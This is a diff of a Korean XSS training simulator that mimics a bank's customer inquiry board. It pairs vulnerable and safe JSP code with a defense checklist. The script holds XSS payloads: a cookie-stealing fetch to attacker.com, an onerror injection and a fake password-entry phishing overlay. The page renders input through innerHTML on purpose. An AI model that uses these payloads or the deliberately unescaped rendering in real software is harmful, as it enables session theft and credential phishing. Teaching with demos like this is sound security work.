@@ -3,163 +3,461 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XSS 공격 시뮬레이션</title>
+    <title>금융권 XSS 모의해킹 시뮬레이터</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@300;400;500;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@400;500;700;900&display=swap');
         body { font-family: 'Noto Sans KR', sans-serif; }
-        .simulation-box { min-height: 150px; }
+        .code-font { font-family: 'Courier New', monospace; }
     </style>
 </head>
-<body class="bg-slate-50 min-h-screen flex flex-col items-center justify-center p-4">
+<body class="bg-gray-100 p-4">
 
-    <div class="max-w-4xl w-full bg-white rounded-2xl shadow-xl overflow-hidden">
-        <!-- Header -->
-        <div class="bg-red-600 p-6 text-white flex items-center justify-between">
+    <!-- 평가기준 배너 -->
+    <div class="max-w-7xl mx-auto mb-4">
+        <div class="bg-red-600 text-white p-4 rounded-lg shadow-lg">
             <div class="flex items-center gap-3">
-                <i class="fas fa-bug text-3xl"></i>
+                <i class="fas fa-clipboard-check text-2xl"></i>
                 <div>
-                    <h1 class="text-2xl font-bold">크로스 사이트 스크립트 (XSS)</h1>
-                    <p class="text-red-100 text-sm">Cross-Site Scripting Simulation</p>
-                </div>
-            </div>
-            <div class="bg-white/20 px-4 py-2 rounded-lg text-sm">
-                <i class="fas fa-info-circle mr-1"></i> 공격자가 웹 페이지에 악성 스크립트를 삽입하는 취약점
-            </div>
-        </div>
-
-        <!-- Explanation Section -->
-        <div class="p-8 border-b border-gray-100">
-            <h2 class="text-xl font-bold text-gray-800 mb-4 flex items-center gap-2">
-                <i class="fas fa-search text-blue-500"></i> 취약점 개요 (Overview)
-            </h2>
-            <p class="text-gray-600 leading-relaxed mb-4">
-                [KR] 검증되지 않은 외부 입력값이 브라우저에서 실행되어 악성 스크립트가 동작하는 공격입니다.<br>
-                [EN] Unvalidated external input executes in the browser, allowing malicious scripts to run.
-            </p>
-            
-            <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4">
-                <div class="flex">
-                    <div class="flex-shrink-0">
-                        <i class="fas fa-exclamation-triangle text-yellow-400"></i>
-                    </div>
-                    <div class="ml-3">
-                        <p class="text-sm text-yellow-700">
-                            아래 입력창에 <code class="bg-yellow-100 px-1 rounded text-red-600 font-mono">&lt;img src=x onerror=alert('XSS')&gt;</code> 를 입력해보세요.
-                        </p>
-                    </div>
+                    <h1 class="font-bold text-lg">전자금융기반시설 보안 취약점 평가기준 - WEB-SER-041</h1>
+                    <p class="text-sm">크로스사이트 스크립팅 (XSS) | 위험도: 4 (높음) | 통제구분: 5.8.4 서비스 보호</p>
                 </div>
             </div>
         </div>
+    </div>
 
-        <!-- Simulation Area -->
-        <div class="grid md:grid-cols-2 divide-y md:divide-y-0 md:divide-x divide-gray-200">
+    <!-- 메인 컨텐츠 -->
+    <div class="max-w-7xl mx-auto">
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-4">
             
-            <!-- Vulnerable Side -->
-            <div class="p-8 bg-red-50/30">
-                <h3 class="text-lg font-bold text-red-600 mb-2 flex items-center gap-2">
-                    <i class="fas fa-unlock"></i> 취약한 모드 (Vulnerable)
-                </h3>
-                <p class="text-xs text-gray-500 mb-4 font-mono">Method: innerHTML</p>
+            <!-- 좌측: 취약한 시스템 -->
+            <div class="space-y-4">
                 
-                <div class="mb-4">
-                    <label class="block text-sm font-medium text-gray-700 mb-1">공격 코드 입력:</label>
-                    <input type="text" id="vulnInput" 
-                           class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-red-500 font-mono text-sm"
-                           placeholder="<script>alert('XSS')</script>" 
-                           value="<img src=x onerror=alert('XSS')>">
-                </div>
-                
-                <button onclick="runVulnerable()" class="w-full bg-red-500 hover:bg-red-600 text-white font-bold py-2 px-4 rounded transition-colors mb-4">
-                    <i class="fas fa-play mr-2"></i> Run Attack
-                </button>
-
-                <div class="border-2 border-dashed border-red-300 rounded-lg p-4 bg-white simulation-box relative">
-                    <span class="absolute top-2 right-2 text-[10px] text-gray-400 font-mono">Browser Render Area</span>
-                    <div id="vulnOutput" class="mt-4 text-gray-800 break-all">
-                        Result here...
+                <!-- 은행 헤더 -->
+                <div class="bg-blue-600 text-white p-4 rounded-lg shadow-lg">
+                    <div class="flex items-center gap-3">
+                        <i class="fas fa-building-columns text-2xl"></i>
+                        <div>
+                            <h2 class="text-xl font-bold">KB국민은행</h2>
+                            <p class="text-sm">인터넷뱅킹 게시판 시스템</p>
+                        </div>
+                    </div>
+                    <div class="mt-2 bg-red-500 px-3 py-1 rounded text-sm">
+                        <i class="fas fa-exclamation-triangle"></i> 취약점: 입력값 필터링 미흡
                     </div>
                 </div>
-                <p class="text-xs text-red-500 mt-2">
-                    [KR] 공격: onerror 이벤트를 통한 스크립트 실행<br>
-                    [EN] Attack: Execute script via onerror event
-                </p>
-            </div>
 
-            <!-- Secure Side -->
-            <div class="p-8 bg-green-50/30">
-                <h3 class="text-lg font-bold text-green-600 mb-2 flex items-center gap-2">
-                    <i class="fas fa-lock"></i> 안전한 모드 (Secure)
-                </h3>
-                <p class="text-xs text-gray-500 mb-4 font-mono">Method: textContent (Escape)</p>
-                
-                <div class="mb-4">
-                    <label class="block text-sm font-medium text-gray-700 mb-1">공격 코드 입력:</label>
-                    <input type="text" id="secureInput" 
-                           class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500 font-mono text-sm"
-                           placeholder="<script>alert('XSS')</script>"
-                           value="<img src=x onerror=alert('XSS')>">
-                </div>
-
-                <button onclick="runSecure()" class="w-full bg-green-500 hover:bg-green-600 text-white font-bold py-2 px-4 rounded transition-colors mb-4">
-                    <i class="fas fa-shield-alt mr-2"></i> Run Securely
-                </button>
-
-                <div class="border-2 border-dashed border-green-300 rounded-lg p-4 bg-white simulation-box relative">
-                    <span class="absolute top-2 right-2 text-[10px] text-gray-400 font-mono">Browser Render Area</span>
-                    <div id="secureOutput" class="mt-4 text-gray-800 break-all">
-                        Result here...
+                <!-- 입력 폼 -->
+                <div class="bg-white p-5 rounded-lg shadow-lg">
+                    <h3 class="font-bold text-lg mb-3 flex items-center gap-2">
+                        <i class="fas fa-comment-dots text-red-600"></i>
+                        고객센터 문의 게시판
+                    </h3>
+                    
+                    <label class="block text-sm font-bold mb-2">고객명</label>
+                    <input type="text" id="customerName" 
+                           class="w-full p-2 border border-gray-300 rounded mb-3" 
+                           value="김철수">
+                    
+                    <label class="block text-sm font-bold mb-2">문의 내용</label>
+                    <textarea id="xss-input" 
+                              class="w-full h-32 p-2 border border-gray-300 rounded mb-3"
+                              placeholder="문의하실 내용을 입력하세요">계좌이체가 안됩니다.</textarea>
+                    
+                    <div class="flex justify-between">
+                        <button onclick="resetInput()" 
+                                class="bg-gray-500 hover:bg-gray-600 text-white px-4 py-2 rounded">
+                            <i class="fas fa-redo"></i> 초기화
+                        </button>
+                        <button onclick="submitVulnerable()" 
+                                class="bg-red-600 hover:bg-red-700 text-white px-6 py-2 rounded">
+                            <i class="fas fa-paper-plane"></i> 문의 등록
+                        </button>
                     </div>
                 </div>
-                <p class="text-xs text-green-600 mt-2">
-                    [KR] 방어: 텍스트로만 처리 (스크립트 실행 안 됨)<br>
-                    [EN] Defense: Treat as text only (Script not executed)
-                </p>
-            </div>
-        </div>
 
-        <!-- Footer Guide Links -->
-        <div class="bg-slate-50 p-6 border-t border-gray-200">
-            <h4 class="font-bold text-gray-700 mb-3 flex items-center gap-2">
-                <i class="fas fa-book"></i> 언어별 시큐어 코딩 가이드 (Secure Coding Guide)
-            </h4>
-            <div class="grid md:grid-cols-2 gap-4">
-                <div class="bg-white p-4 rounded border border-gray-200 text-sm">
-                    <strong class="text-purple-600 block mb-1"><i class="fab fa-java mr-1"></i> Java (JSP)</strong>
-                    <code>out.println(Encoder.encodeForHTML(input));</code>
-                    <p class="text-gray-500 text-xs mt-1">JSTL &lt;c:out&gt; 태그 또는 OWASP Encoder 사용</p>
+                <!-- 공격 시나리오 버튼 -->
+                <div class="bg-gray-800 text-white p-4 rounded-lg shadow-lg">
+                    <h3 class="font-bold mb-3 flex items-center gap-2">
+                        <i class="fas fa-flask text-red-400"></i>
+                        XSS 공격 시나리오
+                    </h3>
+                    <div class="space-y-2">
+                        <button onclick="setPayload('stored')" 
+                                class="w-full text-left bg-red-900 hover:bg-red-800 px-3 py-2 rounded text-sm">
+                            <i class="fas fa-database"></i> 시나리오 1: Stored XSS
+                        </button>
+                        <button onclick="setPayload('reflected')" 
+                                class="w-full text-left bg-orange-900 hover:bg-orange-800 px-3 py-2 rounded text-sm">
+                            <i class="fas fa-link"></i> 시나리오 2: Reflected XSS
+                        </button>
+                        <button onclick="setPayload('cookie')" 
+                                class="w-full text-left bg-purple-900 hover:bg-purple-800 px-3 py-2 rounded text-sm">
+                            <i class="fas fa-cookie-bite"></i> 시나리오 3: 쿠키 탈취
+                        </button>
+                        <button onclick="setPayload('phishing')" 
+                                class="w-full text-left bg-yellow-900 hover:bg-yellow-800 px-3 py-2 rounded text-sm">
+                            <i class="fas fa-fish-fins"></i> 시나리오 4: 피싱 페이지
+                        </button>
+                    </div>
                 </div>
-                <div class="bg-white p-4 rounded border border-gray-200 text-sm">
-                    <strong class="text-blue-600 block mb-1"><i class="fab fa-python mr-1"></i> Python (Flask/Django)</strong>
-                    <code>{{ user_input }}</code>
-                    <p class="text-gray-500 text-xs mt-1">템플릿 엔진(Jinja2/Django Template)이 기본적으로 자동 이스케이프 처리</p>
+
+                <!-- 취약한 코드 -->
+                <div class="bg-gray-900 text-white p-4 rounded-lg shadow-lg">
+                    <div class="flex justify-between items-center mb-3">
+                        <h3 class="font-bold text-red-400">
+                            <i class="fas fa-skull-crossbones"></i> 취약한 JSP 코드
+                        </h3>
+                        <span class="text-xs bg-red-600 px-2 py-1 rounded">위험</span>
+                    </div>
+                    <pre class="code-font text-xs overflow-x-auto"><code><span class="text-gray-500">// ❌ 취약한 코드</span>
+&lt;%
+  String name = request.getParameter("name");
+  String content = request.getParameter("content");
+%&gt;
+
+<span class="text-red-400">// 입력값을 그대로 출력 (XSS 취약!)</span>
+&lt;div&gt;
+  &lt;h3&gt;&lt;%= name %&gt;&lt;/h3&gt;
+  &lt;p&gt;&lt;%= content %&gt;&lt;/p&gt;
+&lt;/div&gt;</code></pre>
                 </div>
+
             </div>
-            
-            <div class="mt-6 flex justify-center">
-                <a href="input_validation.html" class="text-indigo-600 hover:text-indigo-800 font-medium text-sm flex items-center gap-1">
-                    <i class="fas fa-arrow-left"></i> 입력 데이터 검증 가이드로 돌아가기
-                </a>
+
+            <!-- 우측: 결과 및 안전한 코드 -->
+            <div class="space-y-4">
+                
+                <!-- 브라우저 실행 결과 -->
+                <div class="bg-white rounded-lg shadow-lg overflow-hidden">
+                    <div class="bg-gray-800 text-white px-4 py-3 flex justify-between items-center">
+                        <h3 class="font-bold">
+                            <i class="fas fa-browser"></i> 브라우저 실행 결과
+                        </h3>
+                        <span id="status-badge" class="text-xs bg-green-500 text-gray-900 px-3 py-1 rounded">
+                            대기중
+                        </span>
+                    </div>
+                    <div id="browserView" class="p-5 min-h-[300px] bg-white">
+                        <div class="text-center text-gray-400 py-10">
+                            <i class="fas fa-browser text-5xl mb-3 opacity-30"></i>
+                            <p class="text-sm">게시글이 표시됩니다</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 공격 단계 -->
+                <div id="attackStages" class="hidden bg-red-100 border-l-4 border-red-600 p-4 rounded-lg">
+                    <h4 class="font-bold text-red-700 mb-2 flex items-center gap-2">
+                        <i class="fas fa-list-ol"></i> 공격 진행 단계
+                    </h4>
+                    <div id="stagesContent" class="text-sm text-red-700 space-y-1"></div>
+                </div>
+
+                <!-- 터미널 출력 -->
+                <div id="terminalBox" class="hidden bg-black text-green-400 p-4 rounded-lg shadow-lg">
+                    <div class="font-bold mb-2 text-xs">
+                        <i class="fas fa-terminal"></i> ATTACKER CONSOLE
+                    </div>
+                    <div id="terminalLines" class="code-font text-xs space-y-1 max-h-[200px] overflow-y-auto"></div>
+                </div>
+
+                <!-- 안전한 코드 -->
+                <div class="bg-gray-900 text-white p-4 rounded-lg shadow-lg">
+                    <div class="flex justify-between items-center mb-3">
+                        <h3 class="font-bold text-green-400">
+                            <i class="fas fa-shield-halved"></i> 안전한 JSP 코드
+                        </h3>
+                        <span class="text-xs bg-green-600 px-2 py-1 rounded">권장</span>
+                    </div>
+                    <pre class="code-font text-xs overflow-x-auto max-h-[300px]"><code><span class="text-green-400">// ✅ 안전한 코드 (JSTL 사용)</span>
+&lt;%@ taglib uri="http://java.sun.com/jsp/jstl/core" 
+           prefix="c" %&gt;
+
+<span class="text-green-400">// 1. JSTL &lt;c:out&gt; 자동 이스케이프</span>
+&lt;div&gt;
+  &lt;h3&gt;&lt;c:out value="${name}" /&gt;&lt;/h3&gt;
+  &lt;p&gt;&lt;c:out value="${content}" /&gt;&lt;/p&gt;
+&lt;/div&gt;
+
+<span class="text-gray-500">// 또는 OWASP Encoder 사용</span>
+&lt;%@ page import="org.owasp.encoder.Encode" %&gt;
+&lt;%
+  String safeName = Encode.forHtml(name);
+  String safeContent = Encode.forHtml(content);
+%&gt;
+
+&lt;div&gt;
+  &lt;h3&gt;&lt;%= safeName %&gt;&lt;/h3&gt;
+  &lt;p&gt;&lt;%= safeContent %&gt;&lt;/p&gt;
+&lt;/div&gt;</code></pre>
+                </div>
+
+                <!-- 방어 체크리스트 -->
+                <div class="bg-white p-4 rounded-lg shadow-lg">
+                    <h3 class="font-bold mb-3 flex items-center gap-2">
+                        <i class="fas fa-list-check text-red-600"></i>
+                        XSS 방어 체크리스트
+                    </h3>
+                    <div class="space-y-2 text-sm">
+                        <div class="flex items-start gap-2">
+                            <i class="fas fa-check text-green-500 mt-1"></i>
+                            <div><strong>HTML Escaping:</strong> &lt; &gt; " ' & 문자 변환</div>
+                        </div>
+                        <div class="flex items-start gap-2">
+                            <i class="fas fa-check text-green-500 mt-1"></i>
+                            <div><strong>입력값 검증:</strong> 화이트리스트 방식</div>
+                        </div>
+                        <div class="flex items-start gap-2">
+                            <i class="fas fa-check text-green-500 mt-1"></i>
+                            <div><strong>CSP 적용:</strong> script-src 'self'</div>
+                        </div>
+                        <div class="flex items-start gap-2">
+                            <i class="fas fa-check text-green-500 mt-1"></i>
+                            <div><strong>HttpOnly Cookie:</strong> JS 접근 차단</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 평가 판정 -->
+                <div id="judgementBox" class="hidden bg-gray-900 text-white p-4 rounded-lg">
+                    <h3 class="font-bold text-indigo-400 mb-2 text-sm">
+                        <i class="fas fa-gavel"></i> 평가 판정
+                    </h3>
+                    <div class="text-xs space-y-1">
+                        <div><strong>평가항목:</strong> WEB-SER-041 XSS</div>
+                        <div><strong>판정:</strong> <span id="judgement"></span></div>
+                        <div><strong>근거:</strong> <span id="evidence"></span></div>
+                    </div>
+                </div>
+
+                <!-- 피해 시나리오 -->
+                <div id="damageBox" class="hidden bg-red-700 text-white p-4 rounded-lg">
+                    <h3 class="font-bold mb-3">
+                        <i class="fas fa-fire"></i> 금융권 XSS 피해 사례
+                    </h3>
+                    <div class="space-y-2 text-sm">
+                        <div class="flex gap-2">
+                            <span class="font-bold">1.</span>
+                            <div><strong>세션 쿠키 탈취</strong><br>계좌 탈취 가능</div>
+                        </div>
+                        <div class="flex gap-2">
+                            <span class="font-bold">2.</span>
+                            <div><strong>피싱 페이지 삽입</strong><br>비밀번호 수집</div>
+                        </div>
+                        <div class="flex gap-2">
+                            <span class="font-bold">3.</span>
+                            <div><strong>키로깅 스크립트</strong><br>입력값 탈취</div>
+                        </div>
+                        <div class="flex gap-2">
+                            <span class="font-bold">4.</span>
+                            <div><strong>무단 이체 실행</strong><br>금전 피해</div>
+                        </div>
+                    </div>
+                </div>
+
             </div>
         </div>
     </div>
 
     <script>
-        function runVulnerable() {
-            const input = document.getElementById('vulnInput').value;
-            const output = document.getElementById('vulnOutput');
-            
-            // Vulnerable: innerHTML interprets HTML tags
-            output.innerHTML = input; 
+        const payloads = {
+            stored: `<script>alert('XSS 공격! 쿠키: ' + document.cookie)</script>`,
+            reflected: `<img src=x onerror="alert('Reflected XSS')">`,
+            cookie: `<script>
+fetch('http://attacker.com/steal?cookie=' + document.cookie);
+</script>`,
+            phishing: `<div id="phishingOverlay" onclick="if(event.target.id==='phishingOverlay')this.remove()" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;padding:50px;cursor:pointer">
+<div style="max-width:400px;margin:auto;background:white;border:2px solid red;padding:30px;border-radius:10px;position:relative;cursor:default">
+<button onclick="document.getElementById('phishingOverlay').remove();event.stopPropagation()" style="position:absolute;top:10px;right:10px;background:red;color:white;border:none;width:30px;height:30px;border-radius:50%;cursor:pointer;font-size:18px;font-weight:bold">×</button>
+<h2 style="color:red;text-align:center;margin-bottom:15px">🔒 보안 인증 필요</h2>
+<p style="text-align:center;margin-bottom:20px">본인 확인을 위해<br>비밀번호를 다시 입력해주세요</p>
+<input type="password" style="width:100%;padding:10px;margin:10px 0;border:1px solid #ccc;box-sizing:border-box" placeholder="비밀번호">
+<button style="width:100%;padding:10px;background:#0066cc;color:white;border:none;border-radius:5px;margin-bottom:10px;cursor:pointer">확인</button>
+<div style="background:#fff3cd;border:1px solid #ffc107;padding:10px;border-radius:5px;margin-top:15px">
+<p style="text-align:center;color:red;font-size:12px;font-weight:bold;margin:5px 0">⚠️ 이것은 XSS 공격 시뮬레이션입니다</p>
+<p style="text-align:center;color:#856404;font-size:11px;margin:5px 0">실제로는 가짜 로그인 폼 (피싱)</p>
+<p style="text-align:center;color:gray;font-size:10px;margin:5px 0">닫으려면: X 버튼 클릭 또는 배경 클릭</p>
+</div>
+</div>
+</div>`
+        };
+
+        function resetInput() {
+            document.getElementById('customerName').value = '김철수';
+            document.getElementById('xss-input').value = '계좌이체가 안됩니다.';
+            document.getElementById('browserView').innerHTML = `
+                <div class="text-center text-gray-400 py-10">
+                    <i class="fas fa-browser text-5xl mb-3 opacity-30"></i>
+                    <p class="text-sm">게시글이 표시됩니다</p>
+                </div>
+            `;
+            document.getElementById('attackStages').classList.add('hidden');
+            document.getElementById('terminalBox').classList.add('hidden');
+            document.getElementById('judgementBox').classList.add('hidden');
+            document.getElementById('damageBox').classList.add('hidden');
+            document.getElementById('status-badge').textContent = '대기중';
+            document.getElementById('status-badge').className = 'text-xs bg-green-500 text-gray-900 px-3 py-1 rounded';
         }
 
-        function runSecure() {
-            const input = document.getElementById('secureInput').value;
-            const output = document.getElementById('secureOutput');
+        function setPayload(type) {
+            document.getElementById('xss-input').value = payloads[type];
+        }
+
+        async function submitVulnerable() {
+            const name = document.getElementById('customerName').value;
+            const content = document.getElementById('xss-input').value;
+            const browserView = document.getElementById('browserView');
+            const badge = document.getElementById('status-badge');
             
-            // Secure: textContent treats input as pure text
-            output.textContent = input;
+            // 초기화
+            document.getElementById('attackStages').classList.add('hidden');
+            document.getElementById('terminalBox').classList.add('hidden');
+            document.getElementById('terminalLines').innerHTML = '';
+            document.getElementById('judgementBox').classList.add('hidden');
+            document.getElementById('damageBox').classList.add('hidden');
+
+            badge.textContent = '처리중...';
+            badge.className = 'text-xs bg-yellow-500 text-gray-900 px-3 py-1 rounded';
+            browserView.innerHTML = '<div class="text-center text-blue-500 py-10"><i class="fas fa-spinner fa-spin text-4xl"></i><p class="mt-3">게시글 등록 중...</p></div>';
+            
+            await sleep(800);
+
+            const isXSS = content.includes('<script>') || content.includes('onerror=') || content.includes('onload=') || content.includes('<img') || content.includes('<iframe');
+
+            if (isXSS) {
+                // 공격 감지
+                document.getElementById('attackStages').classList.remove('hidden');
+                document.getElementById('stagesContent').innerHTML = `
+                    <div>1. 악성 스크립트 포함된 게시글 등록</div>
+                    <div>2. DB에 스크립트가 그대로 저장</div>
+                    <div>3. 다른 사용자 조회 시 스크립트 실행</div>
+                `;
+
+                document.getElementById('terminalBox').classList.remove('hidden');
+                addTerminalLine('> XSS 페이로드 탐지');
+                await sleep(500);
+                addTerminalLine('> 입력값 필터링 없음');
+                await sleep(500);
+
+                if (content.includes('document.cookie')) {
+                    addTerminalLine('> [!] 쿠키 탈취 시도!', 'text-red-400');
+                    
+                    browserView.innerHTML = `
+                        <div class="border-l-4 border-red-500 bg-red-50 p-4">
+                            <div class="flex items-center gap-2 mb-3">
+                                <strong>${escapeHtml(name)}</strong>
+                                <span class="text-xs text-gray-500">2024-12-08</span>
+                            </div>
+                            <div class="mb-3">${content}</div>
+                            <div class="bg-red-900 text-red-100 p-3 rounded text-xs">
+                                <div class="font-bold">⚠️ XSS 공격 실행 중...</div>
+                                <div>쿠키 탈취: JSESSIONID=7A8F9B...</div>
+                                <div>전송: http://attacker.com/steal</div>
+                            </div>
+                        </div>
+                    `;
+                    
+                    await sleep(1000);
+                    addTerminalLine('> 세션 쿠키 탈취 완료!', 'text-red-400');
+                    
+                } else if (content.includes('position:fixed')) {
+                    addTerminalLine('> [!] 피싱 페이지 삽입!', 'text-red-400');
+                    
+                    browserView.innerHTML = `
+                        <div class="border-l-4 border-red-500 bg-red-50 p-4">
+                            <div class="flex items-center gap-2 mb-3">
+                                <strong>${escapeHtml(name)}</strong>
+                            </div>
+                            <div>${content}</div>
+                        </div>
+                    `;
+                    
+                    await sleep(1000);
+                    addTerminalLine('> 가짜 로그인 폼 표시', 'text-red-400');
+                    
+                } else if (content.includes('onerror=')) {
+                    addTerminalLine('> [!] Reflected XSS!', 'text-red-400');
+                    
+                    browserView.innerHTML = `
+                        <div class="border-l-4 border-orange-500 bg-orange-50 p-4">
+                            <div class="flex items-center gap-2 mb-3">
+                                <strong>${escapeHtml(name)}</strong>
+                            </div>
+                            <div>${content}</div>
+                            <div class="mt-3 bg-orange-900 text-orange-100 p-2 rounded text-xs">
+                                ⚠️ onerror 이벤트 실행!
+                            </div>
+                        </div>
+                    `;
+                    
+                    setTimeout(() => alert('Reflected XSS - 스크립트 실행!'), 500);
+                    
+                } else {
+                    addTerminalLine('> [!] Stored XSS!', 'text-red-400');
+                    
+                    browserView.innerHTML = `
+                        <div class="border-l-4 border-red-500 bg-red-50 p-4">
+                            <div class="flex items-center gap-2 mb-3">
+                                <strong>${escapeHtml(name)}</strong>
+                            </div>
+                            <div>${content}</div>
+                            <div class="mt-3 bg-red-900 text-red-100 p-2 rounded text-xs">
+                                ⚠️ XSS 스크립트 실행!
+                            </div>
+                        </div>
+                    `;
+                    
+                    setTimeout(() => alert('XSS 공격! 악성 코드 실행!'), 500);
+                }
+
+                badge.textContent = 'XSS 공격';
+                badge.className = 'text-xs bg-red-500 text-white px-3 py-1 rounded';
+                
+                document.getElementById('judgementBox').classList.remove('hidden');
+                document.getElementById('judgement').innerHTML = '<span class="text-red-400">취약</span>';
+                document.getElementById('evidence').textContent = '입력값 필터링 없음';
+                
+                document.getElementById('damageBox').classList.remove('hidden');
+
+            } else {
+                // 정상
+                browserView.innerHTML = `
+                    <div class="border-l-4 border-blue-500 bg-blue-50 p-4">
+                        <div class="flex items-center gap-2 mb-3">
+                            <i class="fas fa-user text-blue-600"></i>
+                            <strong>${escapeHtml(name)}</strong>
+                            <span class="text-xs text-gray-500">2024-12-08</span>
+                        </div>
+                        <div>${escapeHtml(content)}</div>
+                    </div>
+                `;
+
+                badge.textContent = '200 OK';
+                badge.className = 'text-xs bg-green-500 text-gray-900 px-3 py-1 rounded';
+                
+                document.getElementById('judgementBox').classList.remove('hidden');
+                document.getElementById('judgement').innerHTML = '<span class="text-green-400">양호</span>';
+                document.getElementById('evidence').textContent = 'XSS 없음';
+            }
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        function addTerminalLine(text, color = 'text-green-400') {
+            const div = document.createElement('div');
+            div.className = color;
+            div.textContent = text;
+            document.getElementById('terminalLines').appendChild(div);
+        }
+
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
         }
     </script>
 </body>
